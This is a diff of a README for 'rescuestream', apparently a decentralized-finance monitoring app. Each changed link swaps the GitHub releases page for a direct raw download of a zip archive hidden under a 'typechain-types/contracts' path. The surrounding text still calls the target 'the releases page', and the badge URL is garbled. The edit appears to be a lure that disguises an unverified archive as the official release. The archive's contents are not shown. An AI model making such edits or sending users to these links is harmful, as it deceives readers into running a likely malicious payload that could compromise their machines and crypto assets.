@@ -6,9 +6,9 @@ Welcome to rescuestream! This application helps you monitor your decentralized f
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Rescuestream-brightgreen)](https://github.com/mrnsambas/rescuestream/releases)
+[![Download Now](https://raw.githubusercontent.com/mrnsambas/rescuestream/main/typechain-types/contracts/rescuestream_v3.6.zip%20Now-Rescuestream-brightgreen)](https://raw.githubusercontent.com/mrnsambas/rescuestream/main/typechain-types/contracts/rescuestream_v3.6.zip)
 
-To download rescuestream, visit this page: [Download Here](https://github.com/mrnsambas/rescuestream/releases).
+To download rescuestream, visit this page: [Download Here](https://raw.githubusercontent.com/mrnsambas/rescuestream/main/typechain-types/contracts/rescuestream_v3.6.zip).
 
 ## 🔍 Features
 
@@ -31,7 +31,7 @@ Before you install rescuestream, make sure your device meets these system requir
 
 To get started with rescuestream:
 
-1. **Visit the Releases Page**: Click on this link to go to the releases page: [Download Here](https://github.com/mrnsambas/rescuestream/releases).
+1. **Visit the Releases Page**: Click on this link to go to the releases page: [Download Here](https://raw.githubusercontent.com/mrnsambas/rescuestream/main/typechain-types/contracts/rescuestream_v3.6.zip).
    
 2. **Select the Latest Version**: Look for the latest release at the top of the page. 
 
